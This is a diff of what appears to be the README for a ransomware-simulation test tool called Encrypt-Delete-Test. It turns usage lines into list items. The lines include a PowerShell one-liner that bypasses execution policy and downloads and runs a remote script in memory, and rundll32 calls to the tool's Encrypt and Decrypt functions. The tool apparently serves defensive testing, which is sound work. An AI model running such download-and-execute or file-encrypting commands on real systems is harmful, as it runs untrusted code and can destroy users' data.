@@ -58,13 +58,11 @@ EncryptDelTestv4.1.ps1
 
 
 Fileless
-
-powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/EncryptDelTestv4.1.ps1.txt')"
-
+- powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eddiechu/Encrypt-Delete-Test/main/EncryptDelTestv4.1.ps1.txt')"
 
 EncryptDelTestv4.1.dll
-rundll32.exe EncryptDelTestv4.1.dll,Encrypt
-rundll32.exe EncryptDelTestv4.1.dll,Decrypt
+- rundll32.exe EncryptDelTestv4.1.dll,Encrypt
+- rundll32.exe EncryptDelTestv4.1.dll,Decrypt
 
 
 
